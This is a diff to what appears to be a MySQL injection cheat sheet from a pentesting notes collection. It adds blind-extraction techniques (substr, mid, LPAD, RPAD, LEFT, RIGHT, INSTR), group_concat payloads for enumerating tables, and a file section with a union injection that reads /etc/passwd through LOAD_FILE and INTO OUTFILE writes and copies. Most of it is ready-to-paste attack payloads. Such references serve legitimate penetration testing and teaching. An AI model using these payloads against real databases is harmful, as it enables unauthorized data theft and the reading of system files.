@@ -30,19 +30,19 @@ count(1)
 
 Usefull functions:
 ```sql
-SELECT group_concat(<COLUMN>) FROM <TABLE>
 SELECT hex(database())
 SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
 SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
 SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
 SELECT replace(database(),"r","R")
-SELECT 'Michael!' REGEXP '.*'
 SELECT substr(database(),1,1)='r'
 SELECT substring(database(),1,1)=0x72
 SELECT ascii(substring(database(),1,1))=114
 SELECT database()=char(114,101,120,116,101,115,116,101,114)
-SELECT group_concat(if(table_schema=database(),table_name,null))
+SELECT group_concat(<COLUMN>) FROM <TABLE>
+SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
 SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
+strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
 ```
 
 ## Flow
@@ -52,6 +52,21 @@ SELECT table_name FROM information_schema.tables WHERE table_schema=database();#
 SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
 SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
 ```
+
+**Only 1 value**
+- Use *group_concat()*
+- Use *Limit X,1*
+
+**Blind one by one**
+- Use *substr(version(),X,1)='r'* or *substring(version(),X,1)=0x70* or *ascii(substr(version(),X,1))=112*
+- Use mid(version(),X,1)='5'
+
+**Blind adding**
+- *LPAD(version(),1...lenght(version()),'1')='asd'...*
+- *RPAD(version(),1...lenght(version()),'1')='asd'...*
+- *SELECT RIGHT(version(),1...lenght(version()))='asd'...*
+- *SELECT LEFT(version(),1...lenght(version()))='asd'...*
+- *SELECT INSTR('foobarbar', 'fo...')=1*
 
 ## Detect columns number
 
@@ -155,21 +170,25 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 ## MYSQL play with files
 
 **Read content: **
+
 ```sql
 ' union select LOAD_FILE('/etc/passwd') --
 ```
 
 **Write content to file: **
+
 ```sql
 select * from users into outfile "/tmp/sql.txt";
 ```
 
 **Copy file: **
+
 ```sql
 select load_file(“/etc/passwd”) into outfile "/tmp/pass.txt";
 ```
 
 **Update value with content of a file: **
+
 ```sql
 UPDATE tabla SET columna=LOAD_FILE(‘/tmp/file’) WHERE id=1;
 ```
